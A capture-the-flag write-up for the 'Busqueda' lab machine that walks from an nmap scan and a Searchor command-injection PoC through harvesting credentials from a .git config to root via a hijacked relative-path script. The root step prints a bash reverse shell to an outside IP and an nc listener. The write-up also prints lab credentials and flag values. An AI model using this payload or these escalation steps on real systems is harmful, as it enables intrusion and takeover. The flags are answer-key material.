# CTF Writeup: Busqueda

---

## Nmap Scan

nmap -n -Pn -sCV -O -p- 10.129.228.217

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 04:02 CDT
Nmap scan report for 10.129.228.217
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT      ADDRESS
1   16.37 ms 10.10.14.1
2   20.24 ms 10.129.228.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.31 seconds
```

## Reconnaissance

Retrieved Version 2.4.0 of Searchor on webpage.

## Initial Access

After some recon I have retrieved a PoC which should give us RCE on the Server.

I was able to retrieve the user.txt flag aswell. 

```
a540392505444751d556c26e4e02f1f6
```

### PoC
```
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
```

## Privilege Escalation

Since the description of the Machine, tells us that we will have to search for credentials within a "git" config file. 
I have utilized following command:
```
find / -iname "*.git" 2>/dev/null
```

## Output
```
/var/www/app/.git
/opt/scripts/.git
```

Gained credentials in 
```
cat /var/www/app/.git/config 
```

cody:jh1usoih2bkjaspwe92

and information about a sub-domain called "gitea.searcher.htb"

## Gitea Sub-Domain

After adding the sub-domain gitea.searcher.htb to /etc/hosts I logged in using cody's credentials.

There is 2 Users in the repository 1. Administrator 2. cody. Unfortunately we are only able to display
cody's app.js & index.html files.

## Enumeration

cat /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Only the root & svc user exist. Since we got the credentials of the svc user, we can login into ssh.
```
ssh svc@searcher.htb
```
Checking which commands can be run with sudo rights from user svc. 

```
sudo -l
```

shows that we can run the system-checkup.py using the python3 binary with root privileges.
```
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Running the command with sudo prompted us to following options

Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
```
     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Utilizing docker-ps shows us running docker containers.
```
CONTAINER ID   IMAGE                COMMAND                  CREATED       STATUS       PORTS                                             NAMES                                                                                                                                                                                                                                                                                           
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   2 years ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea                                                                                                                                                                                                                                                                                           
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

After some research on the docker-inspect functionality, I was able to gain credentials of the Administrator User on Gitea utilizing the docker-inspect command:
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea
```

I used this as [Reference](https://docs.docker.com/reference/cli/docker/inspect/#get-a-subsection-in-json-format)

I went back to http://gitea.searcher.htb/ and logged in with 
```
Administrator:yuiu1hoiu4i5ho1uh
```

Inspecting the system-checkup.py script, which we can run with sudo rights revealed an exploitable relativ path.
Apparently the full-checkup.py is utilizing an bash script.

```
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)

```

## Gaining Root Privileges

I decided to create an full-checkup.sh script in the /tmp directory and added reverse shell payload inside it. Since we are in the /tmp directory,
the full-checkup.py script will actually utilize the full-checkup.sh script from the /tmp directory. Since I will be executing
the command from there.

```
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.62/1234 0>&1
```

Started up a listener on my local machine 

```
nc -lvnp 1234
listening on [any] 1234 ...
```

and ran the command

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Gained Root RCE & retrieved the root.txt flag.

```
root@busqueda:~# cat /root/root.txt
cat /root/root.txt
b0ec9a04efd65cb7893ee83c11bd1d7e
```
